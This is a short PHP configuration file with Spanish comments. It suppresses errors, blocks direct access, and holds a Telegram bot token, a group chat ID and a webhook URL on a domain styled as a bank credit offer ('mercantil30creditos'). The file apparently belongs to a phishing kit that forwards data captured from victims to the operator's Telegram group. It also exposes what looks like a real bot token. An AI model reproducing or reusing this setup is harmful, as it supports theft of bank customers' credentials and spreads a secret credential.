<?php
// 🚫 Ocultar errores y advertencias
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔒 Bloquear acceso directo desde navegador
if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
    http_response_code(403);
    exit('Acceso prohibido.');
}

// ⚙️ Bots y grupos
$telegram_accounts = [

    [
        'token' => '8721074529:AAFSLwoyOoeOhJsoPqutEHNvnH5C4QL5KBw',
        'chat_id' => '-1004378006347'
    ],

];

$webhook_url = 'https://mercantil30creditos.up.railway.app/approve.php';
?>
